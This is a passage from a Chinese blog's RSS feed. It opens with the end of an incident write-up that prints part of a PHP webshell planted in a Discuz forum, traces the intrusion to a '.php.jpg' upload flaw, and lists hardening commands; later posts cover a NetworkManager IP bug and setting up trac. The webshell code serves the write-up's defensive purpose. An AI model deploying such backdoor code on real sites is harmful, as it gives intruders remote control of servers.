<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledump</span> = <span style="color: #8abeb7;">'INSERT INTO `'</span>.$<span style="color: #f0c674;">table</span>.<span style="color: #8abeb7;">'` VALUES ('</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">implode(</span><span style="color: #8abeb7;">", "</span>, $<span style="color: #f0c674;">row</span>).<span style="color: #8abeb7;">');</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">fp</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">fp</span>,$<span style="color: #f0c674;">tabledump</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">tabledump</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">fp</span>,<span style="color: #8abeb7;">"\n\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fr(</span>$<span style="color: #f0c674;">rows</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">p</span>($<span style="color: #f0c674;">str</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">str</span>.<span style="color: #8abeb7;">"\n"</span>;
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">tbhead</span>() {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">tbfoot</span>(){
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/table&gt;'</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">makehide</span>($<span style="color: #f0c674;">name</span>,$<span style="color: #f0c674;">value</span>=<span style="color: #8abeb7;">''</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">makeinput</span>($<span style="color: #f0c674;">arg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>)){
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'size'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'size'</span>] &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">0</span> ? <span style="color: #8abeb7;">"size=\"$arg[size]\""</span> : <span style="color: #8abeb7;">"size=\"100\""</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'extra'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'extra'</span>] ? $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'extra'</span>] : <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'type'</span>] &amp;&amp; $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'type'</span>] = <span style="color: #8abeb7;">'text'</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] ? $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>].<span style="color: #8abeb7;">'&lt;br /&gt;'</span> : <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'class'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'class'</span>] ? $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'class'</span>] : <span style="color: #8abeb7;">'input'</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'newline'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$</span><span style="color: #8abeb7; text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg</span><span style="color: #8abeb7; text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">makeselect</span>($<span style="color: #f0c674;">arg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>)){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'onchange'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">onchange</span> = <span style="color: #8abeb7;">'onchange="'</span>.$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'onchange'</span>].<span style="color: #8abeb7;">'"'</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] ? $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] : <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'newline'</span>]) <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"</span><span style="color: #8abeb7; text-decoration: underline;"> $onchange&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_array(</span>$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'option'</span>])) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'nokey'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'option'</span>] <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">value</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'selected'</span>]==$<span style="color: #f0c674;">value</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;option value=\"$value\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'option'</span>] <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span>=&gt;$<span style="color: #f0c674;">value</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'selected'</span>]==$<span style="color: #f0c674;">key</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;option value=\"$key\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;/select&gt;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'newline'</span>]) <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">formhead</span>($<span style="color: #f0c674;">arg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">self</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'method'</span>] &amp;&amp; $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'method'</span>] = <span style="color: #8abeb7;">'post'</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'action'</span>] &amp;&amp; $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'action'</span>] = $<span style="color: #f0c674;">self</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'target'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'target'</span>] ? <span style="color: #8abeb7;">"target=\"$arg[target]\""</span> : <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'name'</span>] &amp;&amp; $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'name'</span>] = <span style="color: #8abeb7;">'form1'</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho</span><span style="color: #8abeb7; text-decoration: underline;">d=\"$arg[method]\" $arg[target]&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;'</span>.$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>].<span style="color: #8abeb7;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">maketext</span>($<span style="color: #f0c674;">arg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>)){
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'cols'</span>] &amp;&amp; $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'cols'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">100</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'rows'</span>] &amp;&amp; $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'rows'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">25</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] = $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] ? $<span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>].<span style="color: #8abeb7;">'&lt;br /&gt;'</span> : <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name</span><span style="color: #8abeb7; text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">formfooter</span>($<span style="color: #f0c674;">name</span> = <span style="color: #8abeb7;">''</span>){
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">name</span> &amp;&amp; $<span style="color: #f0c674;">name</span> = <span style="color: #8abeb7;">'submit'</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;&lt;input class="bt" name="'</span>.$<span style="color: #f0c674;">name</span>.<span style="color: #8abeb7;">'" id="'</span>.$<span style="color: #f0c674;">name</span>.<span style="color: #8abeb7;">'" type="submit" value=</span><span style="color: #8abeb7; text-decoration: underline;">"Submit"&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">goback</span>(){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">self</span>, $<span style="color: #f0c674;">nowpath</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="post"&gt;&lt;input type="hidden" name="action"</span><span style="color: #8abeb7; text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">formfoot</span>(){
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">encode_pass</span>($<span style="color: #f0c674;">pass</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">pass</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">md5(</span><span style="color: #8abeb7;">'angel'</span>.$<span style="color: #f0c674;">pass</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">pass</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">md5(</span>$<span style="color: #f0c674;">pass</span>.<span style="color: #8abeb7;">'angel'</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">pass</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">md5(</span><span style="color: #8abeb7;">'angel'</span>.$<span style="color: #f0c674;">pass</span>.<span style="color: #8abeb7;">'angel'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">pass</span>;
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">pr</span>($<span style="color: #f0c674;">s</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"&lt;pre&gt;"</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">print_r(</span>$<span style="color: #f0c674;">s</span>).<span style="color: #8abeb7;">'&lt;/pre&gt;'</span>;
}

<span style="color: #b294bb;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #8abeb7;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc_server/data/avatar
</li>
<li>uc_server/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux网络接口上出现两个IP]]></title>
            <link>/article/archlinux-7f517edc63a553e34e0a51fa73b04e244e2a-ip.html</link>
            <guid>/article/archlinux-7f517edc63a553e34e0a51fa73b04e244e2a-ip.html</guid>
            <pubDate>Wed, 12 Mar 2014 03:32:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>发现两个IP

<p>
我的电脑是直接连到公司的墙上的网口上网的，在测试路由器的时候，我把路由器的WAN口接墙上的网口，然后电脑连到路由器的LAN口上，上网正常。查看分配到的IP为192.168.111.2，路由器的IP为192.168.111.1， 想到我一直用 <code>192.168.90.73</code> 这个IP，有些配置也依赖这个IP，所以还想分到这个IP，所以把路由器的DHCP做了设置，路由器IP改为192.168.90.74，分配的IP范围为192.168.90.71-192.168.90.73，再次重连电脑分配的IP为192.168.90.71，然后发现上不了网了，浏览器上输入路由器的IP（192.168.90.74）竟然打开了我机器（192.168.90.71）上建的WEB服务，其他人连这个网络却可以通过192.168.90.74这个IP正常打开路由器界面，最终通过“ip address show”这个命令发现我的网口上有两个IP（192.168.90.71、192.168.90.74）， <code>ipconfig</code> 和其它GUI工具只能看到第一个IP。
</p>
</li>

<li>第二个IP是怎么来的？

<p>
抓包分析了一下DHCP网络包，只给分配了192.168.90.71这个IP，看来192.168.90.74这个IP是我机器上配置的，于是搜索/etc、/var下的文件，最后在/var/log/journal/*/system.journal中找到了日志：
</p>

<pre class="example">
NetworkManager[375]: &lt;debug&gt; [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74/24'
</pre>

<p>
然后在NetworkManager的配置文件 <code>/etc/NetworkManager/system-connections/Profile 1</code> 中找到了相关配置：
</p>

<pre class="example">
[ipv4]
method=auto
address1=192.168.90.74/24,192.168.90.2
</pre>

<p>
删除掉 <code>address1</code> 后，再重连网络，就只有一个IP了。
</p>

<p>
这应该是 <code>NetworkManager</code> 的一个 <a href="https://bugs.archlinux.org/task/41395">BUG</a> ，当手动设置IP后切回DHCP自动获取IP方式时不清除手动设置的时会出现。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[开源项目管理系统：trac]]></title>
            <link>/article/5f006e90987976ee7ba174067cfb7edfff1a-trac.html</link>
            <guid>/article/5f006e90987976ee7ba174067cfb7edfff1a-trac.html</guid>
            <pubDate>Sun, 09 Mar 2014 16:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
最近负责为公司搭建项目管理系统，有如下要求：
</p>
<ul class="org-ul">
<li>支持BUG管理
</li>

<li>支持帐号管理
</li>

<li>支持WIKI
</li>

<li>支持任务分配
</li>

<li>支持中文
</li>
</ul>

<p>
由于时间紧迫，感觉 <code>redmine</code> 界面更漂亮，相关资料也好找，而且帐号管理、中文支持方面的很不错，所以选择了 <code>redmine</code> 。其实心里面一直希望选的是基于 <code>python</code> 开发的系统，一方面自已喜欢 <code>python</code> ，另外团队中对 <code>python</code> 熟悉的人比较多，这样后面需要做二次开发时会容易一些。
</p>

<p>
<code>trac</code> 给人的第一感觉是太过于简单粗糙了。界面朴实简洁尚可接受、演示站点中文化不彻底、自已安装的时候较之 <code>redmine</code> 更是磕磕绊绊。=trac= 使用 <code>Babel</code> 进行多语言支持，当前的trac稳定版（1.0）存在中文支持方面的Bug：<a href="http://trac.edgewall.org/ticket/10903">Wrong `NullTranslations` class in functional tests</a> ，我在安装过程中就遇到了，正是这个问题才觉得先研究一下 <code>Babel</code> ，于是有了上一篇文章 《<a href="http://blog.kankanan.com/posts/2014/03/09_python5e94752856fd96455316ff1ababel.html">python应用国际化：Babel</a>》， <code>trac</code> 下一版（1.1）对这个问题进行了修复。 网络上有很多人对 <code>trac</code> 夸赞有加，另外 <code>trac</code> 还有持续集成的插件： <a href="http://bitten.edgewall.org/">Bitten</a> ， 在对 <code>Babel</code> 有一定了解后，我终于鼓气勇气研究起 <a href="http://trac.edgewall.org/">trac</a> 。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">安装最新版 <code>trac</code></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>使用学习 <code>Babel</code> 时建的虚拟环境

<div class="org-src-container">

<pre class="src src-sh">workon LearnBabel
</pre>
</div>
</li>

<li>从最新源代码安装 <code>trac</code>

<div class="org-src-container">

<pre class="src src-sh">svn checkout http://svn.edgewall.org/repos/trac/trunk trac
<span style="color: #b294bb;">cd</span> trac
python ./setup.py install
</pre>
</div>
</li>

<li>建一个项目看看效果

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">cd</span> ~/Examples/python
trac-admin LearnTrac initenv
tracd --port 8080 LearnTrac &amp;
xdg-open http://localhost:8080
</pre>
</div>
</li>
</ul>

<p>
感觉 <code>trac</code> 的中文化做得还不够彻底，但是关键的部位都已经中文化，不影响对整个系统的使用，有了 <code>Babel</code> 的经验之后对它进行中文化是很容易的，翻译后提交给 <code>trac</code> 开发人员，也算是回馈开源社区了。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">配置用户</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>创建帐号文件 <code>LearnTrac/conf/users.digest</code>

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #f0c674;">user</span>=admin
<span style="color: #f0c674;">realm</span>=localhost
<span style="color: #f0c674;">password</span>=admin
<span style="color: #f0c674;">file</span>=LearnTrac/conf/users.digest
<span style="color: #b294bb;">echo</span> ${<span style="color: #f0c674;">user</span>}:${<span style="color: #f0c674;">realm</span>}:$(<span style="color: #b294bb;">printf</span> <span style="color: #8abeb7;">"${user}:${realm}:${password}"</span> | md5sum - | sed -<span style="text-decoration: underline;">e </span><span style="color: #8abeb7; text-decoration: underline;">'s/\s\+-//'</span><span style="text-decoration: underline;">) &gt;&gt; ${</span><span style="color: #f0c674; text-decoration: underline;">file</span><span style="text-decoration: underline;">}</span>
</pre>
</div>
</li>

<li>重新启动服务

<div class="org-src-container">

<pre class="src src-python">tracd -p 8080 --<span style="color: #f0c674;">auth</span>=<span style="color: #8abeb7;">"LearnTrac,LearnTrac/conf/users.digest,localhost"</span> LearnTrac
</pre>
</div>
</li>
</ul>

<p>
现在可以使用 <code>admin</code> 帐号登录了
</p>

<p>
